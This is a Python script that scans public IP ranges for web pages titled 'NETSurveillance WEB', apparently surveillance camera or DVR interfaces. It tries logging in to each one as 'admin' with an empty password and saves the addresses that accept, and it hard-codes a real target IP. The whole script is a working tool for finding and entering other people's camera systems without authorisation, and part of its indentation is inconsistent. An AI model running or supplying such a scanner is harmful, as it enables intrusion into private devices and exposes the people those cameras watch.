#coding=utf-8

import datetime
import requests
from bs4 import BeautifulSoup
import lxml
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

def checklogin(LoginUrl):

	try:
		success=False
		title = 'none'
		Browser = webdriver.Chrome("C:\selenium_driver_chrome\chromedriver.exe")
		#LoginUrl= ('http://114.32.1.144/Login.htm')
		UserName= ('admin')
		#UserPass= ('#####')
		Browser.get(LoginUrl)
		Browser.find_element_by_id('username').send_keys(UserName)
		#Browser.find_element_by_id('password').send_keys(UserPass)
		Browser.find_element_by_id('username').send_keys(Keys.ENTER)
		#Browser.save_screenshot('test.png')
		title = Browser.title
		#print(title)
		success=True
		Browser.quit()
	except:
		#print(title)
		Browser.quit()

	return success
	
def subnetScan(subnet2,subnet3):
	a='NETSurveillance WEB'
	count = 1
	iplist = []
	
	for ip in range(1,256,1):
		try:
			url = 'http://114.'+str(subnet2)+'.'+str(subnet3)+'.'+str(ip)+'/'
			#print(url)
			res = requests.get(url,timeout=0.2)
			soup = BeautifulSoup(res.text,'lxml')
			title = soup.select('title')[0].text

			if a==title:
				#print(url+'Login.htm')
				urllogin = url+'Login.htm'
				#print(urllogin)
				#count =count+1
				#print('title pass')
				if checklogin(urllogin):
					#iplist.append(urllogin)
					iplist.append(url)
					#print('pwd pass')
			else:
				'do nothing'
		except:
			#b='o'
			'do nothing'

	print('done for '+str(subnet3)+' subnet: '+ str(len(iplist)) +' IPs')
	now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

	with open('output'+str(subnet2)+'.txt','a') as fp:
	    fp.write('\n'.join(iplist))
        fp.write('\n')
	    #fp.write('\n\ndone for '+str(subnet3)+' subnet: '+ str(len(iplist)) +' IPs')
	    #fp.write('\n'+now+'\n\n')

    
if __name__ == '__main__':
	print(checklogin('http://114.32.1.144/Login.htm'))
	#subnetScan(32,1)
